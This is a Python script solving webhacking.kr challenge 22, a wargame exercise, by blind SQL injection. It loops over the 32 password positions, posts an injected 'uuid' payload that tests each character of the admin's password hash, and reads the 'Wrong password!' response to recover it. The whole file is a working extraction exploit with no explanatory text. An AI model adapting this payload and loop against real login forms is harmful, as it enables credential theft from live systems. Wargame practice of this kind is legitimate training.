import requests
import string

url = "http://webhacking.kr/challenge/bonus/bonus-2/index.php"
cookies = {'PHPSESSID' : 'my_session'}
chr_list = string.ascii_lowercase+'1234567890'

result=''
length=32

for i in range (1,length+1) :
    for j in chr_list : #webhacking 22번 https://famous7.github.io/webhacking/webhacking.kr-22/.
        params = {"uuid":"admin' and if(substr(pw,"+str(i)+",1)in("+hex(ord(j))+"),1,0)#","pw":""}
        req = requests.post(url,data=params,cookies=cookies)
        print("i: "+ str(i)+" char:"+j)
        print("url: "+url,end="\n")
        if((req.text).find("Wrong password!")>0):
            print("The %dth Letter is "%i+j)
            result += j
            break

print(result)
